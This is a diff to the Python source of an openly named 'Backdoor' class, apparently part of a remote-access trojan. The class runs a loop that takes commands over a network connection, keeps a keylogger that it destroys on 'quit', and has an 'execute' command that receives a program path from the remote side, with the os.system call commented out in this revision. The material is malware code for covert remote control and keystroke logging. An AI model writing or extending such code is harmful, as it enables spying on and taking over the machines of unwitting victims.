@@ -7,7 +7,6 @@ import threading
 import time
 import re
 import shutil
-import pyautogui
 from urllib.request import urlopen
 
 
@@ -80,8 +79,10 @@ class Backdoor:
         except Exception:
             return ''
 
-    def start_program(self, path, name):
-        print(path, name)
+    def start_program(self):
+        path = self.connection.recv(1024).decode()
+        print(path)
+        #os.system(f"'{path}'") 
   
 #        try:
 #            os.chdir(path)
@@ -101,12 +102,12 @@ class Backdoor:
 
     def run(self):
         while True:
-            command = self.receive_data()
-            print(f'command: {command}')
+            command = [self.receive_data()]
+            print(*command)
             data = None
 
             try:
-                if command[0] == 'exit':
+                if command[0] == 'quit':
                     self.connection.close()
                     try:
                         self.keylogger.destruct()
@@ -164,7 +165,6 @@ class Backdoor:
                 elif command[0] == 'execute':
                     try:
                         self.start_program()
-                        data = 'Program Executed'
                     except:
                         data = 'Program Not Executed'
 
